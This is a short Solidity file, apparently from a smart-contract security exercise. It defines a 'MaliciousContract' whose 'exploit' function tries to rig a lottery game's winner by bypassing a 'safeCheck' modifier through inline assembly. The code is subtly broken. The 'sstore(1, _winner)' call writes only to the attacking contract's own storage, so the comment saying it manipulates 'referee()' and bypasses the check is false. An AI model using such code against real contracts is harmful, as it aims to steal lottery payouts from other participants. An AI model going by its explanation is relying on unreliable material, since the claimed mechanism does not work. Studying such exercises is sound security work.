// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./Backdoor-assembly.sol";

contract MaliciousContract {
    LotteryGame public lotteryGame;

    constructor(address _lotteryGame) {
        lotteryGame = LotteryGame(_lotteryGame);
    }

    function exploit(address _winner) public {
        // Bypass the safeCheck modifier by directly manipulating the referee() function using assembly
        assembly {
            // Set the winner address in the contract's storage
            sstore(1, _winner)
        }

        // Call the pickWinner function to update the winner
        lotteryGame.pickWinner(_winner);
    }
}